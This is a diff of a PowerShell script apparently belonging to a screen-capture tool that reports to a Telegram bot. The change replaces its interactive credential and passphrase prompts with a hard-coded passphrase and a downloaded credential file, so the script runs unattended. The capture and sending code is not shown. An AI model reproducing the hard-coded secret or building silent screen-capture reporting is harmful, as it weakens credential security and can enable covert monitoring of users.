@@ -1,4 +1,11 @@
-# --- Define a local base directory in APPDATA for storing files ---
+# ------------------------------
+# Set a default passphrase for automation (change this value to your actual passphrase)
+# ------------------------------
+$DefaultPassphrase = "YourSecurePassphrase"  # <<< Replace with your passphrase
+
+# ------------------------------
+# Define a local base directory in APPDATA for storing files
+# ------------------------------
 $LocalBase = Join-Path $env:APPDATA "ScreenCaptureTelegramBot"
 if (-not (Test-Path $LocalBase)) {
     New-Item -ItemType Directory -Path $LocalBase | Out-Null
@@ -16,24 +23,16 @@ if (-not (Test-Path $CredFile)) {
         Write-Host "Downloaded cred.dat successfully."
     }
     catch {
-        Write-Host "Failed to download cred.dat. You will be prompted for credentials."
+        Write-Host "Failed to download cred.dat. Exiting..."
+        exit
     }
 }
 
 # ------------------------------
-# Function: Get Passphrase from Environment or Prompt
+# Function: Get Passphrase (automated version)
 # ------------------------------
 function Get-Passphrase {
-    if ($env:MY_CRED_PASSPHRASE) {
-        return $env:MY_CRED_PASSPHRASE
-    }
-    else {
-        return [Runtime.InteropServices.Marshal]::PtrToStringAuto(
-                    [Runtime.InteropServices.Marshal]::SecureStringToBSTR(
-                        (Read-Host "Enter passphrase to decrypt credentials" -AsSecureString)
-                    )
-                )
-    }
+    return $DefaultPassphrase
 }
 
 # ------------------------------
@@ -107,25 +106,8 @@ function Get-Credentials {
         [string]$CredFile
     )
     if (-not (Test-Path $CredFile)) {
-        Write-Host "Credential file not found. Please enter your Telegram credentials."
-        $PlainBotToken = Read-Host "Enter your Telegram Bot Token"
-        $PlainChatID   = Read-Host "Enter your Telegram Chat ID"
-        $Passphrase = Get-Passphrase
-        
-        $EncryptedBotToken = Encrypt-String -plainText $PlainBotToken -password $Passphrase
-        $EncryptedChatID   = Encrypt-String -plainText $PlainChatID   -password $Passphrase
-        
-        $CredObject = @{
-            BotToken = $EncryptedBotToken
-            ChatID   = $EncryptedChatID
-        }
-        $credFolder = Split-Path $CredFile
-        if (-not (Test-Path $credFolder)) {
-            New-Item -ItemType Directory -Path $credFolder | Out-Null
-        }
-        $CredObject | ConvertTo-Json | Out-File $CredFile -Encoding UTF8
-        Write-Host "Credentials encrypted and saved to $CredFile."
-        return $CredObject
+        Write-Host "Credential file not found. Exiting..."
+        exit
     }
     else {
         $CredObject = Get-Content $CredFile -Raw | ConvertFrom-Json
@@ -136,7 +118,7 @@ function Get-Credentials {
     }
 }
 
-# Retrieve credentials (this will load your token and chat id if cred.dat exists)
+# Retrieve credentials (will use the hard-coded passphrase automatically)
 $Creds = Get-Credentials -CredFile $CredFile
 $BotToken = $Creds.BotToken
 $ChatID   = $Creds.ChatID
